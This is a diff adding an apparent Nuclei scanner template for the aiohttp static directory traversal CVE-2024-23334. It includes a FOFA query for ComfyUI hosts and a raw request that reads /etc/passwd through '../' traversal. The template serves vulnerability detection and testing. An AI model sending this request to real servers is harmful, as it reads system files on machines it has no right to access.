@@ -1,0 +1,29 @@
+id: aiohttp-static-directory-traversal
+
+info:
+  name: aiohttp static 目录遍历 CVE-2024-23334
+  author: HuanXiong
+  severity: high
+  description: |-
+    fofa：title=="ComfyUI"
+    aiohttp static 存在目录遍历漏洞，恶意攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等。
+  reference:
+    - 
+  tags: Directory traversal
+
+http:
+  - raw:
+      - |
+        GET /static/../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36
+        Connection: close
+        Accept: */*
+        Accept-Language: en
+        Accept-Encoding: gzip
+ 
+    matchers:
+      - type: dsl
+        name: 目录遍历
+        dsl:
+          - 'status_code==200 && contains_all(body,"/bin/bash")'
